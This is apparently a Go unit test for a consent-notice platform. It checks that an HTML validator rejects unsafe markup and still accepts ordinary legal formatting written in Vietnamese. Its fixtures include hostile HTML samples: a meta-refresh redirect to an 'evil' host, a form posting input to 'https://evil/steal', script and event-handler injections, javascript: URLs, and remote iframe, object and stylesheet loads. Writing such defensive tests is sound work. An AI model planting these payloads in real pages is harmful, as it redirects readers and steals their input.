package domain

import (
	"errors"
	"strings"
	"testing"
)

// TestValidateBodyHTMLRejectsNavigation pins the finding a browser demonstrated:
// a consent permalink advertised as immutable legal evidence, served with a
// one-year immutable cache header, that forwards its reader to a page the
// attacker controls -- using no script, so no content security policy stops it.
func TestValidateBodyHTMLRejectsNavigation(t *testing.T) {
	t.Parallel()

	unsafe := map[string]string{
		"meta refresh, the demonstrated attack": `<p>Chính sách</p><meta http-equiv="refresh" content="0;url=http://evil/">`,
		"meta with odd spacing":                 `<META   http-equiv=refresh content="0;url=x">`,
		"base tag rewrites every link":          `<base href="https://evil/">`,
		"form posts the reader's input away":    `<form action="https://evil/steal" method="POST"><button>Tiếp tục</button></form>`,
		"script":                                `<script>alert(1)</script>`,
		"script with whitespace":                `< script >alert(1)</script>`,
		"inline event handler":                  `<p onclick="alert(1)">x</p>`,
		"javascript url":                        `<a href="javascript:alert(1)">x</a>`,
		"iframe":                                `<iframe src="https://evil/"></iframe>`,
		"object":                                `<object data="https://evil/"></object>`,
		"stylesheet link":                       `<link rel="stylesheet" href="https://evil/x.css">`,
		"css import":                            `<style>@import url(https://evil/x.css)</style>`,
		"data uri source":                       `<img src=data:image/svg+xml;base64,PHN2Zz4=>`,
		"empty":                                 "   ",
	}
	for name, body := range unsafe {
		t.Run(name, func(t *testing.T) {
			t.Parallel()
			err := ValidateBodyHTML(body)
			if err == nil {
				t.Fatalf("ValidateBodyHTML accepted %q", body)
			}
			if !errors.Is(err, ErrUnsafeBody) {
				t.Errorf("error = %v, want ErrUnsafeBody", err)
			}
			// The message has to name what was refused: a legal team editing a
			// consent notice cannot act on "invalid input".
			if !strings.Contains(err.Error(), "không cho phép") &&
				!strings.Contains(err.Error(), "trống") {
				t.Errorf("error %q does not say what was refused", err)
			}
		})
	}

	// Over-rejecting is its own failure: this is a legal text and it needs real
	// formatting.
	safe := []string{
		`<h1>Chính sách bảo vệ dữ liệu</h1><p>Chúng tôi thu thập <strong>họ tên</strong> và số điện thoại.</p>`,
		`<ul><li>Mục đích 1</li><li>Mục đích 2</li></ul><table><tr><td>a</td></tr></table>`,
		`<p>Liên hệ: <a href="https://acme.vn/lien-he">acme.vn</a></p>`,
		`<p style="font-weight:bold">Điều 3</p><blockquote>Trích dẫn luật</blockquote>`,
		`<p>Bạn có quyền yêu cầu xóa dữ liệu &mdash; xem Điều 14.</p>`,
	}
	for _, body := range safe {
		if err := ValidateBodyHTML(body); err != nil {
			t.Errorf("ValidateBodyHTML rejected legitimate markup %q: %v", body, err)
		}
	}
}
